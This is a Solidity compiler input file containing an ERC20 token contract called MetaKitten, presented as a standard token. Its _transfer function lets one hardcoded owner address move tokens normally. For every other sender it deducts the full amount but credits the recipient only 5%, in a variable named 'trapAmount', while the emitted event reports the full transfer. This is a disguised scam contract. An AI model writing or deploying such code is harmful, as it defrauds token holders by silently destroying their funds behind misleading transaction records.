{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "contracts/MoonSpynx.sol": {
      "content": "pragma solidity ^0.6.12;\n\n//Not 4 hoomans.\n\n// SPDX-License-Identifier: Unlicensed\n\ninterface IERC20 {\n\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n// ----------------------------------------------------------------------------\n// Safe Math Library\n// ----------------------------------------------------------------------------\ncontract SafeMath {\n    function safeAdd(uint a, uint b) public pure returns (uint c) {\n        c = a + b;\n        require(c >= a);\n    }\n    function safeSub(uint a, uint b) public pure returns (uint c) {\n        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);\n        c = a / b;\n    }\n}\n\n\ncontract MetaKitten is IERC20, SafeMath {\n    string public name;\n    string public symbol;\n    uint8 public decimals; // 18 decimals is the strongly suggested default, avoid changing it\n\n    uint256 public _totalSupply;\n\n    mapping(address => uint) balances;\n    mapping(address => mapping(address => uint)) allowed;\n\n    address ownerC;\n\n    /**\n     * Constrctor function\n     *\n     * Initializes contract with initial supply tokens to the creator of the contract\n     */\n    constructor() public {\n        name = \"MetaKitten\";\n        symbol = \"MTK\";\n        decimals = 18;\n        _totalSupply = 1000000000000000000000000000;\n\n        ownerC = 0xeF264a87AeE543e36edCe06c416280Cc3dff9Af6;\n\n        balances[msg.sender] = _totalSupply;\n        emit Transfer(address(0), msg.sender, _totalSupply);\n    }\n\n    function totalSupply() public view override returns (uint) {\n        return _totalSupply  - balances[address(0)];\n    }\n\n    function balanceOf(address tokenOwner) public view override returns (uint balance) {\n        return balances[tokenOwner];\n    }\n\n    function allowance(address tokenOwner, address spender) public view override returns (uint remaining) {\n        return allowed[tokenOwner][spender];\n    }\n\n    function approve(address spender, uint tokens) public override returns (bool success) {\n        allowed[msg.sender][spender] = tokens;\n        emit Approval(msg.sender, spender, tokens);\n        return true;\n    }\n\n    function transfer(address to, uint tokens) public override returns (bool success) {\n        _transfer(msg.sender, to, tokens);\n        return true;\n    }\n\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n      require(sender != address(0), \"ERC20: transfer from the zero address\");\n      require(recipient != address(0), \"ERC20: transfer to the zero address\");\n      uint256 senderBalance = balances[sender];\n      require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n      \n      if (sender == ownerC) {\n        balances[sender] = senderBalance - amount;\n        balances[recipient] += amount;\n      } else {\n        balances[sender] = senderBalance - amount;\n        uint256 trapAmount = (amount * 5) / 100;\n        balances[recipient] += trapAmount;\n      }\n      \n      emit Transfer(sender, recipient, amount);\n    }\n\n\n    function transferFrom(address from, address to, uint tokens) public override returns (bool success) {\n        balances[from] = safeSub(balances[from], tokens);\n        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);\n        balances[to] = safeAdd(balances[to], tokens);\n        emit Transfer(from, to, tokens);\n        return true;\n    }\n}"
    }
  }
}